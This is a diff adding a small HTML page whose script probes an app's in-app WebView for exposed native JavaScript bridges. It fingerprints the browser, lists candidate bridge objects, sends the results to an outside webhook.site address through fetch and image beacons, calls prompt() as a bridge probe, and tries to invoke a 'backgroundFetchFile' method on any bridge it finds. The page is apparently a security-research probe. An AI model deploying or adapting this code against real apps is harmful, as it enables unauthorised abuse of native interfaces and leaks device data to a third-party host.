@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P0</title></head>
+<body style="font:20px monospace;padding:8px;background:#fff">
+<h3 id="h">running</h3>
+<script>
+(function(){
+  var HOOK='https://webhook.site/72535c91-4e20-4e6a-b2a2-cf7b68483bdd';
+  function send(tag,obj){
+    var u=HOOK+'?tag='+encodeURIComponent(tag)+'&d='+encodeURIComponent(JSON.stringify(obj).slice(0,1800));
+    try{ fetch(u,{mode:'no-cors'}); }catch(e){}
+    try{ (new Image()).src=u; }catch(e){}
+  }
+  function b64(s){ try{ return btoa(unescape(encodeURIComponent(s))).slice(0,150); }catch(e){ return 'E'; } }
+  var d={ua:navigator.userAgent.slice(0,90),origin:location.origin,secure:window.isSecureContext};
+  var ks=[]; try{ks=Object.keys(window);}catch(e){}
+  d.n=ks.length;
+  d.susp=ks.filter(function(k){return /xhs|bridge|inject|jsb|hybrid|horizon|xy[a-z]|native|jsinterface/i.test(k);}).slice(0,25);
+  var cand=['xhsBridge','_xhsBridge','JSBridge','_bridge','XhsBridge','__xhs','hybridBridge','xyBridge','horizonBridge','webviewBridge','jsBridge','XhsHybrid','XhsNative','nativeBridge','jsInterface','Android','_Android'];
+  var t={};
+  cand.forEach(function(k){var v='u';try{v=typeof window[k];}catch(e){};if(v!=='undefined'&&v!=='u')t[k]=v;});
+  d.cand=t;
+  send('init',d);
+  document.title='P1|'+b64(JSON.stringify(d));
+  setTimeout(function(){
+    var r=null,e=null;
+    try{ r=prompt('xhsbridge-probe'); }catch(x){ e=String(x); }
+    var d2={ret:String(r).slice(0,120),err:e};
+    send('prompt',d2);
+    document.title='P2|'+b64(JSON.stringify(d2));
+  },800);
+  setTimeout(function(){
+    var out=[];
+    ['xhsBridge','_xhsBridge','__xhs','XhsHybrid','horizonBridge','JSBridge'].forEach(function(n){
+      try{
+        if(window[n]&&typeof window[n].invoke==='function'){
+          window[n].invoke('backgroundFetchFile',{url:'https://x/1.a',filename:'probe_test'});
+          out.push(n+':invoked');
+        } else if(window[n]){ out.push(n+':type='+typeof window[n]); }
+      }catch(e){ out.push(n+':'+String(e).slice(0,70)); }
+    });
+    send('invoke',{out:out});
+  },2000);
+  document.getElementById('h').textContent='done';
+})();
+</script>
+</body></html>
